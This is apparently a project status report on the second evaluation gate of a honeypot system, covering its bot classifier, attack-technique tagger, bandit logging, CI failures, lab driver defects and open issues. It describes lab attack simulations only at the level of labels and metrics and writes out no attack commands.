| 3, 4 Demos | **Pass**, on what the system itself wrote. Demo 1: the tagger's labels are exactly the six promised tactics, the classifier calls the working session a scripted bot, the upload is an indexed artifact, and one actor alert carries artifact, persistence and impact. Demo 2: the web sweep is a scanner by the rule, the MySQL session a bot by the model, the tagger finds Reconnaissance and Credential Access on the first and Initial Access and Collection on the second, and one actor alert names both sessions and both addresses. |
| 5 Split integrity | **Pass.** Ten checks on the frozen dataset, among them: no session or procedure spans splits, every row is filed under the split the frozen file gives it, all 41 held-out procedures have captured steps, the session table has only allowlisted columns, no input carries a lab address or ID, and nothing in the tagger's index comes from a held-out procedure. |
| 6 Classifier | **Pass.** On the 312 sessions the rule leaves (44 scenario groups), macro-F1 0.994 (95% interval 0.981 to 1.000), above the majority class by 0.516 to 0.569. On all 390 sessions it is above the rule alone by 0.343 to 0.379. One error: a human-paced session called a bot. The event-level variant scores 0.902 (0.787 to 0.979). The real-traffic check is below. |
| 7 Tagger | **Pass, and weak.** Technique micro-F1 0.212 (0.067 to 0.346) over 35 held-out procedures of 23 techniques; the most-frequent baseline scores 0, and the paired difference has the same interval. Precision 0.24, recall 0.19, abstention 0.20. By source: own 0.264, Atomic-derived 0.203, corpus 0.0. On the 4 procedures of a technique with no lab training procedure, which only the public corpus covers, recall is 0.25. Session-level tactic F1 0.464. The held-out split has no explicit negative, so false labels on harmless input are not measured there; on dev, 4 of 5 negatives were given a technique. |
| 8 Bandit logging | **Pass.** 1,347 explore sessions and 5,822 decisions (this run and a short later one); no explored decision outside the lab range; no masked action taken; seven context buckets tested, smallest p-value 0.26; a uniform target's mean importance weight 1.002 (0.970 to 1.036). |
| 9 Off-policy estimators | **Pass.** Each estimator recovers a known value on synthetic logs (unit suite). The shadow policy against the rules on 874 decisions in 160 held-out sessions: doubly robust −0.164 (−0.509 to +0.107), with SNIPS and IPS of the same sign; effective sample 208; it differs from the rules on 25% of decisions. It does not beat the rules, and the rules act. |
| 10 Regression job | **Pass.** `make eval-regression` recomputes every tracked metric from the frozen dataset and matches the committed baseline, with identical numbers on the lab host (Linux) and on a laptop (macOS), with no model and no store. Unit tests lower a metric, drop one, flip a gate, swap the dataset and swap the chosen model, and see it fail each time. |
| 11 Phase 1 still holds | **Pass.** Gate 0 and Gate 1, the latency limit among them, in the same integration run: 57 tests passed, none skipped, with a missing stack set to fail. |

**Does the harness describe the running system?** The live worker's labels for the 246 held-out steps of the capture run were read back from `mirage.labels` and set beside what the same model answers offline: 246 of 246 the same, no input with two labels, and the same score (0.212). `mirage-eval served` repeats this.

**Real traffic** (`mirage_intel.realcheck`, 3,560 sessions of the replayed public Cowrie sample). The rule settles 2,774 (no access). Of the 786 the model decided, it called every one a scripted bot and none a person. It agrees with the "same commands from three or more sources" heuristic on all 381 such sessions. The 88 sessions that logged in and typed nothing are scanners by the heuristic and bots by the model: a difference of definition, not an error either way. Agreement over the 469 heuristic-labelled sessions is 0.81 (0.46 to 0.93, resampling sources). The tagger abstains on 49% of the sample's 53 distinct commands and 76% of their 850 occurrences; of the labels it gives, half are Stealth and a quarter Discovery. There is no ground truth here: this shows the models do nothing absurd on traffic nobody here wrote, and no more.

**Found by running it.**

- The decoys fell back to `allow` on 2.4% of explore decisions, against 0.5% a day earlier. The learned tagger's worker was asking the model about one input at a time and held seven to nine CPU cores beside the policy service. It now asks once per round for everything, runs at low priority (4 CPUs at most in Docker), and with it a short explore run fell back once in 641 decisions.
- Two of 144 held-out texts had a best match tied between index entries that name different techniques, and the tie was settled by floating-point noise: one answer on Linux, another on macOS. Ties now follow a fixed rule, and every number above is identical on both.
- The frozen vectors were first stored at half precision, which moved a few similarities across the abstention threshold (0.212 became 0.211). They are stored at the model's precision.
- One training procedure (`fetch-tftp-get`) was skipped on every run, so 204 of the catalogue's 205 procedures reached a decoy and the frozen dataset has no step for it. Demo 1's step before it jumped past it on failure, and that step always fails (no egress). Fixed in the scenario on 15 November 2026 for later collections; the frozen dataset is unchanged.
- The explore run's join reports 3 `no_event` and 8 `mismatch` steps. Test 2 covers capture runs, where both counts are zero. All eleven are the explorer's own doing, confirmed from the decisions the decoy applied in those sessions. The eight mismatches are MySQL logins: the decoy had accepted the login, the explorer answered the statement the client's driver sends while connecting with `fake_error`, and the runner's connect call failed, so the runner recorded a failed login beside a captured successful one. The three `no_event` steps are Redis commands that followed a `terminate` on the same connection by 0.1 to 0.4 s: the connection was closed and the command never reached the decoy. Nothing was lost by the capture. The join does not yet tell these apart from a real capture fault; the explore campaign of phase 3 (3.3) needs it to.
- Runs on the lab host recorded a stale code version: the file sync left the host's `.git` at an old commit, so `MIRAGE_CODE_VERSION` named an older commit than the code that ran. The two collection runs behind the frozen dataset are affected (they record `afa7b64`; the code was this branch's working tree before commit `038e560`). Fixed for later runs: `tools/lab-host/sync.sh` copies the history with the files, and a run now records `git describe --dirty`, so code that differs from its commit says so.
- The first CI run on GitHub (15 November 2026) failed in the integration job, on a defect no machine with a large disk could show. The message broker sizes its storage limit from the disk that is free when it starts (three quarters of it), every stream reserves its cap against that limit, and phase 2's third stream raised the reservation to 5 GB. A runner with about 6 GB free offered 4.6 GB, refused the third stream, and every pipeline worker stopped at start. The limit is now set in `compose/nats/nats.conf` (6 GB), so it no longer depends on the host; a unit test fails if the streams' caps outgrow it. Reproduced and checked on the lab host with a broker held to the runner's limit, and with the new configuration on a 100 MB disk.
- The second CI run failed one step later, on a command that had never been run: `make tagger-model-host` without `GPU=1` put an environment assignment behind `nice`. On the lab host the learned tagger had only been started from the GPU environment or in Docker. Fixed, and the CI step now fails at once, with the log, when the worker exits early.
- Rehearsing the CI job on the lab host before pushing again showed that demo 1 failed about one run in three, for two reasons, neither of them the tagger's. The test read the predicted class from whichever version of the actor's alert first had its reasons, one sweep before the class reaches it; the class is now part of what the test waits for. And the lab's SSH driver drew its wrong password guesses from a list that held passwords the decoy accepts: a profile renders up to three for root, the driver knew one. Some seeds therefore logged in on a "wrong" guess, and a run with no failed login has no brute force for the tagger's session rule to find. The runner now tells the driver every accepted password, and a unit test covers it.
- That driver defect is in the frozen dataset. Its labels are still true, because they describe what happened, but the sessions hold fewer failed logins than their scenarios describe: of 354 wrong guesses asked for in 120 login sequences, 80 were never sent because the login had already succeeded, and at least 31 sequences were cut short. The classifier's gate is not affected (a session's label follows from whether it held access). The tagger's session-tactic figure (0.464) is lowered by it: a sequence that got in on its first try has no failed login for the brute-force rule to see, while the ground truth still names the technique.
- The third CI run passed 56 of the 57 integration tests on GitHub's runner, both demos included, and failed Gate 1 test 9: the SSH gate's 95th-percentile decision time was 22.1 ms against the 20 ms budget. The phase 1 stack passed the same test on the same kind of runner (12 November), and the lab host passes it every time, so the cause is what phase 2 added, on a machine with four cores. Measured on the lab host with every container pinned to four cores: 3 to 6 ms in three runs with the learned tagger off; with it on, 5 to 14 ms in six runs and 33 ms in a seventh. Limiting the tagger to one CPU thread did not help, so its thread count is not the cause. A profile of that test shows where the cores go: ClickHouse (0.7 of a core on average, 1.5 at peak) and the classifier worker (0.3 on average, 1.9 at peak), which reads each changed session again; the policy service itself uses 0.1. Not fixed. The budget is unchanged and the test is unchanged. The check is intermittent on that runner, not solidly red: the next run, on the `phase-3` branch with nothing changed in the stack, passed. It sits close to the budget there until the background workers are made to yield to the gate (below).

**How to run it.** On a lab host: `make lab-seed`, `make up`, `make lab-up`; `make lab-run SCENARIOS=/lab/scenarios` and `make lab-explore SCENARIOS=/lab/scenarios`; `make dataset CAPTURE=<run> EXPLORE=<run>`; `make eval`; `make freeze`; `make models DATA=eval/datasets/gate2`; then `make gate2`. Anywhere, with no stack: `make eval-regression`.

**The learned tagger's worker** needs PyTorch. `make ml-image` builds its Docker image (2.5 GB, CPU); `make tagger-model-host` runs the same worker from the research environment, and with `GPU=1` from the GPU environment (`make gpu-env`: the locked versions with PyTorch's CUDA 13.2 build). All three were run. On the lab host's RTX 3060 Ti the GPU gives the same vectors to within 5e-7, no nearest neighbour or threshold decision changes, and embeds the frozen dataset's 1,127 texts in 1.9 s against 18.9 s. The final integration run used the Docker image. Containers cannot use the GPU there until the NVIDIA container toolkit is installed, which needs root: `tools/lab-host/install-runtimes.sh`, run with `sudo`, installs it together with the sandbox runtime phase 3 needs.

**Still open, none of it part of Gate 2:**

- No real person has been recorded yet (`make lab-human`, Q8). The classifier's human class is our own typing generator, and every human session is SSH.
- The tagger is weak on commands it has not seen: about one held-out procedure in five. More labelled procedures is the lever ([experiment](experiments/phase-2/tagger.md)).
- The classifier's novelty feature (share of inputs first seen in the session against the corpus) is not built.
- The held-out split has no explicit negative procedure, so the tagger's false-label rate on harmless input is measured on dev only.
- CI on GitHub fails intermittently on one check: the gate's latency on a four-core runner (22.1 ms against 20 ms on one run of 15 November, a pass on the next; see "Found by running it"). The other four jobs and the other 56 integration tests pass there. The likely fix is to give the gate's containers (policy, decoys, edge) a higher CPU weight than the background workers, and to make the classifier worker cheaper per changed session; neither is done. It matters before a sensor runs on a small machine (2.9), and it is Gate 3 test 11's concern as well.
- The frozen dataset predates two lab fixes (the SSH driver's wrong guesses, and the procedure that never ran). Its labels are true; the next collection is the first without those defects, and the dataset is not re-frozen until then.
- 2.9, the first external sensor, waits for the exposure checklist as before.
